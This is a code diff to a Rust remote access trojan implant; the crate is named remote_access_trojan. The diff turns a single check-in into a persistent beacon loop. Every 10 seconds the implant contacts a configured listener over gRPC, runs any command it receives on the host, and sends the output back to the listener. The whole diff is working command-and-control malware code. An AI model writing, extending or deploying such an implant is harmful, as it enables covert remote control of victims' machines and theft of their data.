@@ -4,7 +4,8 @@ use remote_access_trojan::rat::{Beacon, CommandResponse};
 use std::collections::hash_map::DefaultHasher;
 use std::hash::{Hash, Hasher};
 use std::process::Command;
-use std::time::SystemTime;
+use std::thread;
+use std::time::{Duration, SystemTime};
 use tonic::transport::Endpoint;
 
 // Some TODOs in no meaningful order
@@ -113,40 +114,44 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("implant");
 
     let implant_id = generate_implant_id();
-
+    let cadence = Duration::from_millis(10000);
     // Can I send a protobuf from the client to the server?
     let ip_address = rco_config::LISTENER_IP;
     let port = rco_config::LISTENER_PORT;
     let socket = format!("http://{ip_address}:{port}");
     let channel = Endpoint::from_shared(socket)?
-                           .connect()
-                           .await?;
+                        .connect()
+                        .await?;
     let mut ask_client = AskForInstructionsClient::new(channel.clone());
     let mut response_client = RecordCommandResultClient::new(channel);
-    let request = tonic::Request::new(
-        Beacon {
-            last_received: 0
-        },
-    );
-    let response = ask_client.send(request).await?.into_inner();
-    println!("Response={response:?}");
 
-    let command_received = response.command;
-    if !command_received.is_empty() {
-        let command = Command::new(&command_received)
-                              .output()
-                              .unwrap();
-        let command_response = String::from_utf8(command.stdout).unwrap();
-        let result = tonic::Request::new(
-            CommandResponse {
-                implant_id: implant_id,
-                timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                command: command_received,
-                result: command_response
+    loop {
+        let request = tonic::Request::new(
+            Beacon {
+                last_received: 0
             },
         );
-        let response = response_client.send(result).await?.into_inner();
-        println!("{response:?}");
+        let response = ask_client.send(request).await?.into_inner();
+        println!("Response={response:?}");
+
+        let command_received = response.command;
+        if !command_received.is_empty() {
+            let command = Command::new(&command_received)
+                                .output()
+                                .unwrap();
+            let command_response = String::from_utf8(command.stdout).unwrap();
+            let result = tonic::Request::new(
+                CommandResponse {
+                    implant_id: implant_id.clone(),
+                    timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                    command: command_received,
+                    result: command_response
+                },
+            );
+            let response = response_client.send(result).await?.into_inner();
+            println!("{response:?}");
+        }
+        thread::sleep(cadence);
     }
 
     Ok(())
